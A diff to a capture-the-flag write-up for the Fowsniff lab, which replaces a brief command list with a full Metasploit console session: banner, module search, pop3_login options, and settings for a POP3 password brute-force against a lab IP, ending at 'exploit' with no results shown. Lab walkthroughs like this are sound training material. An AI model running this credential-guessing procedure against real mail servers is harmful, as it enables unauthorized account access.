@@ -118,13 +118,102 @@ Using the `_/auxiliary/scanner/pop3/pop3_login_ module` in Metasploit, we can 
 Set the required parameters then run your exploit.
 
 ```
-use auxiliary/scanner/pop3/pop3_login
-set RHOSTS 10.10.110.111
-set USER_FILE users.txt
-set PASS_FILE pass.txt
-set VERBOSE false
-set STOP_ON_SUCCESS true
-exploit
+┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
+└─# msfconsole
+Metasploit tip: Network adapter names can be used for IP options set LHOST 
+eth0
+                                                  
+
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+       =[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search pop3 login
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/pop3/pop3_login  .                normal  No     POP3 Login Utility
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/pop3/pop3_login
+
+msf > use 0
+msf auxiliary(scanner/pop3/pop3_login) > options
+
+Module options (auxiliary/scanner/pop3/pop3_login):
+
+   Name              Current Setting                Required  Description
+   ----              ---------------                --------  -----------
+   ANONYMOUS_LOGIN   false                          yes       Attempt to login with a blank username and password
+   BLANK_PASSWORDS   false                          no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                              yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                          no        Try each user/password couple stored in the current
+                                                              database
+   DB_ALL_PASS       false                          no        Add all passwords in the current database to the lis
+                                                              t
+   DB_ALL_USERS      false                          no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                           no        Skip existing credentials stored in the current data
+                                                              base (Accepted: none, user, user&realm)
+   PASSWORD                                         no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framewo  no        The file that contains a list of probable passwords.
+                     rk/data/wordlists/unix_passwo
+                     rds.txt
+   RHOSTS                                           yes       The target host(s), see https://docs.metasploit.com/
+                                                              docs/using-metasploit/basics/using-metasploit.html
+   RPORT             110                            yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                          yes       Stop guessing when a credential works for a host
+   THREADS           1                              yes       The number of concurrent threads (max one per host)
+   USERNAME                                         no        A specific username to authenticate as
+   USERPASS_FILE                                    no        File containing users and passwords separated by spa
+                                                              ce, one pair per line
+   USER_AS_PASS      false                          no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framewo  no        The file that contains a list of probable users acco
+                     rk/data/wordlists/unix_users.            unts.
+                     txt
+   VERBOSE           true                           yes       Whether to print output for all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/pop3/pop3_login) > set RHOSTS 10.82.154.253
+RHOSTS => 10.82.154.253
+msf auxiliary(scanner/pop3/pop3_login) > set USERPASS_FILE fowsniffusers
+USERPASS_FILE => fowsniffusers
+msf auxiliary(scanner/pop3/pop3_login) > set PASS_FILE fowsniffpass
+PASS_FILE => fowsniffpass
+msf auxiliary(scanner/pop3/pop3_login) > set VERBOSE false
+VERBOSE => false
+msf auxiliary(scanner/pop3/pop3_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf auxiliary(scanner/pop3/pop3_login) > exploit
+
 ```
 
 
